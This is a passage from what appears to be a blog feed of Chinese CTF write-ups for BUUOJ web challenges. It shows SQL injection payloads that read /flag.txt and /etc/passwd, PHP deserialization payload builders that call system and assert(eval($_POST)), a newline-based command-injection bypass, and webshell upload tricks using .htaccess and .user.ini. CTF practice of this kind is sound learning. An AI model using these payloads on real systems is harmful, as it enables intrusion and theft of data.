&#x3D; &quot;未找到订单!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">    $msg &#x3D; &quot;信息不全&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里对刚刚传入的address参数没有做任何处理就放进了数据表中，那么我们只要在原始传入带有sql注入的address参数，然后在这个页面发起请求，那个sql语句就会被触发，然后就可以成功执行sql注入。<br>思路有了以后，构造payload,这里用的是报错注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(load_file(&#39;&#x2F;flag.txt&#39;),1,20)),0x7e),1)#</span><br></pre></td></tr></table></figure><p>直接读取显示不全，分两段读取payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(load_file(&#39;&#x2F;flag.txt&#39;),20,50)),0x7e),1)#</span><br></pre></td></tr></table></figure><p>然后就得到flag了。</p><h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;CISCN2019-总决赛-Day2-Web1-Easyweb&quot;&gt;&lt;a href=&quot;#CISCN2019-总决赛-Day2-Web1-Easyweb&quot; class=&quot;headerlink&quot; title=&quot;[CISCN2019 总决赛 Day2 Web1]Easyweb&quot;&gt;&lt;/a&gt;[CISCN2019 总决赛 Day2 Web1]Easyweb&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;考点：盲注，文件上传&lt;br&gt;查看robots.txt：&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>buuoj 刷题记录（一）</title>
    <link href="http://yoursite.com/2020/07/13/buuoj_01/"/>
    <id>http://yoursite.com/2020/07/13/buuoj_01/</id>
    <published>2020-07-13T12:30:32.000Z</published>
    <updated>2020-07-23T16:40:30.994Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><a id="more"></a><p>抓包</p><p><img src="/images/20200723201821.png" alt=""></p><p>date是一个函数，后面的p应该是它的参数，猜测使用了call_user_func(函数名，参数)函数<br>使用 <code>func=readfile&amp;p=index.php</code> 读取源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$disable_fun &#x3D; array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,</span><br><span class="line">  &quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,</span><br><span class="line">  &quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,</span><br><span class="line">  &quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,</span><br><span class="line">  &quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,</span><br><span class="line">  &quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,</span><br><span class="line">  &quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,</span><br><span class="line">  &quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,</span><br><span class="line">  &quot;file_put_contents&quot;);</span><br><span class="line">function gettime($func, $p) &#123;</span><br><span class="line">    $result &#x3D; call_user_func($func, $p);</span><br><span class="line">    $a&#x3D; gettype($result);</span><br><span class="line">    if ($a &#x3D;&#x3D; &quot;string&quot;) &#123;</span><br><span class="line">        return $result;</span><br><span class="line">    &#125; </span><br><span class="line">    else &#123;</span><br><span class="line">    return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Test &#123;</span><br><span class="line">    var $p &#x3D; &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">    var $func &#x3D; &quot;date&quot;;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if ($this-&gt;func !&#x3D; &quot;&quot;) &#123;</span><br><span class="line">            echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;*</span><br><span class="line">$func &#x3D; $_REQUEST[&quot;func&quot;];</span><br><span class="line">$p &#x3D; $_REQUEST[&quot;p&quot;];</span><br><span class="line">if ($func !&#x3D; null) &#123;</span><br><span class="line">    $func &#x3D; strtolower($func);</span><br><span class="line">    if (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">        echo gettime($func, $p);</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        die(&quot;Hacker...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>禁用了很多函数，看到有 <strong>__destruct()</strong> 函数，尝试构造反序列化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test &#123;</span><br><span class="line">    var $p &#x3D; &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">    var $func &#x3D; &quot;date&quot;;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if ($this-&gt;func !&#x3D; &quot;&quot;) &#123;</span><br><span class="line">            echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; new Test();</span><br><span class="line">&#x2F;&#x2F;$a-&gt;p &#x3D; &#39;find &#x2F; -name flag*&#39;;</span><br><span class="line">$a-&gt;p &#x3D; &#39;cat &#x2F;tmp&#x2F;flagoefiu4r93&#39;;</span><br><span class="line"></span><br><span class="line">$a-&gt;func &#x3D; &#39;system&#39;;</span><br><span class="line">print_r(urlencode(serialize($a)));</span><br></pre></td></tr></table></figure><p>寻找flag文件<br><img src="/images/20200724003619.png" alt=""></p><p>读取flag<br><img src="/images/20200724003709.png" alt=""></p><h2 id="MRCTF2020-你传你ma呢"><a href="#MRCTF2020-你传你ma呢" class="headerlink" title="[MRCTF2020]你传你ma呢"></a>[MRCTF2020]你传你ma呢</h2><p>利用BurpSuite修改MIME欺骗后端文件类型 修改 Content-Type: image/png 然后就可以传任意文件后缀 利用.htaccess来制作图片马</p><p>增加使用php解析的文件后缀(.jpg)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p><img src="/images/20200724003759.png" alt=""></p><p>然后再写个一句话，连上蚁剑即可</p><p><img src="/images/20200724003852.png" alt=""></p><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>绕过后缀名检验：<code>php、php3、php5、php7、pht、phtml</code><br>文件头加入 <code>GIF89a</code><br>修改 <code>Content-Type: image/jpeg</code><br>可解析为php的标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line">&lt;?&#x3D; phpinfo(); ?&gt;</span><br><span class="line">&lt;script language&#x3D;php&gt;phpinfo();&lt;&#x2F;script&gt;    &#x2F;&#x2F;php7移除</span><br><span class="line">&lt;? phpinfo(); ?&gt;    &#x2F;&#x2F;需要php.ini中short_open_tag&#x3D;On</span><br><span class="line">&lt;% phpinfo(); %&gt;    &#x2F;&#x2F;需要php.ini中asp_tags &#x3D; On  php7移除</span><br></pre></td></tr></table></figure><p>php版本是5.5.9，用第三个<br>上传之后连接蚁剑即可</p><h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">putenv(&#39;PATH&#x3D;&#x2F;home&#x2F;rceservice&#x2F;jail&#39;);</span><br><span class="line"></span><br><span class="line">if (isset($_REQUEST[&#39;cmd&#39;])) &#123;</span><br><span class="line">  $json &#x3D; $_REQUEST[&#39;cmd&#39;];</span><br><span class="line"></span><br><span class="line">  if (!is_string($json)) &#123;</span><br><span class="line">    echo &#39;Hacking attempt detected&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">  &#125; elseif (preg_match(&#39;&#x2F;^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\&#x2F;;-@\[-&#96;|~\x7F]+).*$&#x2F;&#39;, $json)) &#123;</span><br><span class="line">    echo &#39;Hacking attempt detected&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    echo &#39;Attempting to run command:&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">    $cmd &#x3D; json_decode($json, true)[&#39;cmd&#39;];</span><br><span class="line">    if ($cmd !&#x3D;&#x3D; NULL) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      echo &#39;Invalid input&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &#39;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>正则表达式修饰符s匹配多行，这里直接用<code>%0A</code>换行符绕过正则payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%0A&quot;cmd&quot;: &quot;&#x2F;bin&#x2F;cat &#x2F;home&#x2F;rceservice&#x2F;flag&quot;%0A&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Linux命令的位置：/bin,/usr/bin，默认都是全体用户使用，/sbin,/usr/sbin,默认root用户使用</p></blockquote><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><blockquote><p>考点：文件上传</p></blockquote><p>利用<strong>.user.ini</strong>构造php后门，<strong>.user.ini</strong>的使用前提是目录中必须有至少一个php文件，<strong>.user.ini</strong>有两个配置参数：<strong>auto_prepend_file</strong>和<strong>auto_append_file</strong>。<br>auto_prepend_file指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;01.gif</span><br></pre></td></tr></table></figure><p>01.gif是要包含的文件。<br>所以，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。<br><img src="/images/20200724003955.png" alt=""></p><blockquote><p>参考链接<br><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p></blockquote><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>没什么好说的，apache服务器上传<strong>.htaccess</strong>文件</p><h2 id="BJDCTF-2nd-Schrödinger"><a href="#BJDCTF-2nd-Schrödinger" class="headerlink" title="[BJDCTF 2nd]Schrödinger"></a>[BJDCTF 2nd]Schrödinger</h2><p>毫无意义的一道题，浪费了十几分钟的时间。</p><h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p>查看源码有<code>flag.php</code>，访问然后修改<code>X-Forwarded-For: 127.0.0.1</code>可得flag</p><h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><blockquote><p>二次注入，git泄露</p></blockquote><p>爆破得到账号密码，登陆<br>然后是git泄露，先下载源码然后修复，得到如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;mysql.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line">if($_SESSION[&#39;login&#39;] !&#x3D; &#39;yes&#39;)&#123;</span><br><span class="line">    header(&quot;Location: .&#x2F;login.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#39;do&#39;]))&#123;</span><br><span class="line">switch ($_GET[&#39;do&#39;])</span><br><span class="line">&#123;</span><br><span class="line">case &#39;write&#39;:</span><br><span class="line">    $category &#x3D; addslashes($_POST[&#39;category&#39;]);</span><br><span class="line">    $title &#x3D; addslashes($_POST[&#39;title&#39;]);</span><br><span class="line">    $content &#x3D; addslashes($_POST[&#39;content&#39;]);</span><br><span class="line">    $sql &#x3D; &quot;insert into board</span><br><span class="line">            set category &#x3D; &#39;$category&#39;,</span><br><span class="line">                title &#x3D; &#39;$title&#39;,</span><br><span class="line">                content &#x3D; &#39;$content&#39;&quot;;</span><br><span class="line">    $result &#x3D; mysql_query($sql);</span><br><span class="line">    header(&quot;Location: .&#x2F;index.php&quot;);</span><br><span class="line">    break;</span><br><span class="line">case &#39;comment&#39;:</span><br><span class="line">    $bo_id &#x3D; addslashes($_POST[&#39;bo_id&#39;]);</span><br><span class="line">    $sql &#x3D; &quot;select category from board where id&#x3D;&#39;$bo_id&#39;&quot;;</span><br><span class="line">    $result &#x3D; mysql_query($sql);</span><br><span class="line">    $num &#x3D; mysql_num_rows($result);</span><br><span class="line">    if($num&gt;0)&#123;</span><br><span class="line">    $category &#x3D; mysql_fetch_array($result)[&#39;category&#39;];</span><br><span class="line">    $content &#x3D; addslashes($_POST[&#39;content&#39;]);</span><br><span class="line">    $sql &#x3D; &quot;insert into comment</span><br><span class="line">            set category &#x3D; &#39;$category&#39;,</span><br><span class="line">                content &#x3D; &#39;$content&#39;,</span><br><span class="line">                bo_id &#x3D; &#39;$bo_id&#39;&quot;;</span><br><span class="line">    $result &#x3D; mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(&quot;Location: .&#x2F;comment.php?id&#x3D;$bo_id&quot;);</span><br><span class="line">    break;</span><br><span class="line">default:</span><br><span class="line">    header(&quot;Location: .&#x2F;index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    header(&quot;Location: .&#x2F;index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>do=write的时候对传入的数据进行转移，但是之后数据库会自动清除反斜杠，然后do=commit的时候对取出的category没有进行处理就插入，导致了二次注入，所以前面那个addslashes根本起不到防护的作用<br>第一次输入category和第二次输入content可以拼接，如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">insert into comment</span><br><span class="line">set category &#x3D; &#39;&#39;,content&#x3D;user(),&#x2F;*&#39;,</span><br><span class="line">    content &#x3D; &#39;*&#x2F;#&#39;,</span><br><span class="line">    bo_id &#x3D; &#39;$bo_id&#39;&quot;;</span><br></pre></td></tr></table></figure><p>然后再放两个payload，读取flag:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;,content&#x3D;(select load_file(&#39;&#x2F;etc&#x2F;passwd&#39;)),&#x2F;*</span><br><span class="line">&#39;,content&#x3D;(select hex(load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag_8946e1ff1ee3e40f.php&#39;))),&#x2F;*</span><br></pre></td></tr></table></figure><h2 id="elementmaster"><a href="#elementmaster" class="headerlink" title="elementmaster"></a>elementmaster</h2><p>这个没什么好说的，直接上脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import requests as req</span><br><span class="line">elements &#x3D; (&#39;H&#39;, &#39;He&#39;, &#39;Li&#39;, &#39;Be&#39;, &#39;B&#39;, &#39;C&#39;, &#39;N&#39;, &#39;O&#39;, &#39;F&#39;, &#39;Ne&#39;, &#39;Na&#39;, &#39;Mg&#39;, &#39;Al&#39;, &#39;Si&#39;, &#39;P&#39;, &#39;S&#39;, &#39;Cl&#39;, &#39;Ar&#39;,</span><br><span class="line">                  &#39;K&#39;, &#39;Ca&#39;, &#39;Sc&#39;, &#39;Ti&#39;, &#39;V&#39;, &#39;Cr&#39;, &#39;Mn&#39;, &#39;Fe&#39;, &#39;Co&#39;, &#39;Ni&#39;, &#39;Cu&#39;, &#39;Zn&#39;, &#39;Ga&#39;, &#39;Ge&#39;, &#39;As&#39;, &#39;Se&#39;, &#39;Br&#39;, </span><br><span class="line">                  &#39;Kr&#39;, &#39;Rb&#39;, &#39;Sr&#39;, &#39;Y&#39;, &#39;Zr&#39;, &#39;Nb&#39;, &#39;Mo&#39;, &#39;Te&#39;, &#39;Ru&#39;, &#39;Rh&#39;, &#39;Pd&#39;, &#39;Ag&#39;, &#39;Cd&#39;, &#39;In&#39;, &#39;Sn&#39;, &#39;Sb&#39;, &#39;Te&#39;, </span><br><span class="line">                  &#39;I&#39;, &#39;Xe&#39;, &#39;Cs&#39;, &#39;Ba&#39;, &#39;La&#39;, &#39;Ce&#39;, &#39;Pr&#39;, &#39;Nd&#39;, &#39;Pm&#39;, &#39;Sm&#39;, &#39;Eu&#39;, &#39;Gd&#39;, &#39;Tb&#39;, &#39;Dy&#39;, &#39;Ho&#39;, &#39;Er&#39;, &#39;Tm&#39;, </span><br><span class="line">                  &#39;Yb&#39;, &#39;Lu&#39;, &#39;Hf&#39;, &#39;Ta&#39;, &#39;W&#39;, &#39;Re&#39;, &#39;Os&#39;, &#39;Ir&#39;, &#39;Pt&#39;, &#39;Au&#39;, &#39;Hg&#39;, &#39;Tl&#39;, &#39;Pb&#39;, &#39;Bi&#39;, &#39;Po&#39;, &#39;At&#39;, &#39;Rn&#39;, </span><br><span class="line">                  &#39;Fr&#39;, &#39;Ra&#39;, &#39;Ac&#39;, &#39;Th&#39;, &#39;Pa&#39;, &#39;U&#39;, &#39;Np&#39;, &#39;Pu&#39;, &#39;Am&#39;, &#39;Cm&#39;, &#39;Bk&#39;, &#39;Cf&#39;, &#39;Es&#39;, &#39;Fm&#39;,&#39;Md&#39;, &#39;No&#39;, &#39;Lr&#39;,</span><br><span class="line">                  &#39;Rf&#39;, &#39;Db&#39;, &#39;Sg&#39;, &#39;Bh&#39;, &#39;Hs&#39;, &#39;Mt&#39;, &#39;Ds&#39;, &#39;Rg&#39;, &#39;Cn&#39;, &#39;Nh&#39;, &#39;Fl&#39;, &#39;Mc&#39;, &#39;Lv&#39;, &#39;Ts&#39;, &#39;Og&#39;, &#39;Uue&#39;)</span><br><span class="line">for symbol in elements:</span><br><span class="line">    link &#x3D; &quot;http:&#x2F;&#x2F;bb55496d-1807-46ab-96ae-138ad4583386.node3.buuoj.cn&#x2F;&quot; + symbol + &quot;.php&quot;</span><br><span class="line">    response &#x3D; req.get(link)</span><br><span class="line">    if response.status_code &#x3D;&#x3D; 200:</span><br><span class="line">        print(response.text, end&#x3D;&#39;&#39;)</span><br><span class="line">    else:</span><br><span class="line">        continue</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;网鼎杯-2020-朱雀组-phpweb&quot;&gt;&lt;a href=&quot;#网鼎杯-2020-朱雀组-phpweb&quot; class=&quot;headerlink&quot; title=&quot;[网鼎杯 2020 朱雀组]phpweb&quot;&gt;&lt;/a&gt;[网鼎杯 2020 朱雀组]phpweb&lt;/h2&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>BUUCTF[NPUCTF2020]web WP</title>
    <link href="http://yoursite.com/2020/05/28/Kath4rs1s/"/>
    <id>http://yoursite.com/2020/05/28/Kath4rs1s/</id>
    <published>2020-05-28T06:56:49.914Z</published>
    <updated>2020-07-20T10:32:51.733Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="BUUCTF-NPUCTF2020"><a href="#BUUCTF-NPUCTF2020" class="headerlink" title="BUUCTF[NPUCTF2020]"></a>BUUCTF[NPUCTF2020]</h1><p>上周做了做NPUCTF的题，今天在buuoj上面复现了一波，顺便写写write up</p><a id="more"></a><h2 id="ReadlezPHP"><a href="#ReadlezPHP" class="headerlink" title="ReadlezPHP"></a>ReadlezPHP</h2><p>这是一道简单的反序列化的题<br>进入页面没什么发现，只有一个跳转到西工大官网的链接，然后查看源码，发现一个隐藏的a标签</p><p><img src="https://img2020.cnblogs.com/blog/2015024/202004/2015024-20200423190116592-758599765.png" alt=""></p><p>然后进入页面，看到了源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#error_reporting(0);</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a &#x3D; &quot;Y-m-d h:i:s&quot;;</span><br><span class="line">        $this-&gt;b &#x3D; &quot;date&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $a &#x3D; $this-&gt;a;</span><br><span class="line">        $b &#x3D; $this-&gt;b;</span><br><span class="line">        echo $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c &#x3D; new HelloPhp;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;source&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp &#x3D; unserialize($_GET[&quot;data&quot;]);</span><br></pre></td></tr></table></figure><p>这段代码的关键在于当执行反序列化函数的时候，调用__destruct函数执行<em>echo $b($a)</em>，我们便可以利用这个函数执行任意我们想执行的函数，从而达到getshell的目的。<br>接下来便是写php脚本构造序列化了，期间试了很多函数比如<em>system</em>等等都被禁用了，但是我们还可以用<strong>assert</strong>这个函数。<br>首先我们来了解一下断言（assert）这个函数，参考大佬的文章<a href="https://blog.csdn.net/ojingzhiyuan12/article/details/88556074">PHP assert 和 eval</a></p><blockquote><p>assert   判断一个表达式是否成立。返回true or false；</p></blockquote><p>我们来看一个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; &quot;123&quot;;</span><br><span class="line">echo assert(is_numeric($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这段代码输出的结果是：<br><img src="https://img2020.cnblogs.com/blog/2015024/202004/2015024-20200423195608051-314750544.png" alt=""></p><p>简言之就是<em>assert()</em>可以将整个字符串参数当作php参数执行，而类似的<em>eval()</em>函数是执行合法的php代码。<br>接下来放出序列化的脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$c &#x3D; new HelloPhp;</span><br><span class="line">$c-&gt;b &#x3D; &#39;assert&#39;;</span><br><span class="line">$c-&gt;a &#x3D; &#39;eval($_POST[a]);&#39;;</span><br><span class="line">echo urlencode(serialize($c)).&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里除了用<em>assert()</em>之外，还可以用<strong>call_user_func()</strong>函数</p><blockquote><p>call_user_func — 把第一个参数作为回调函数调用</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 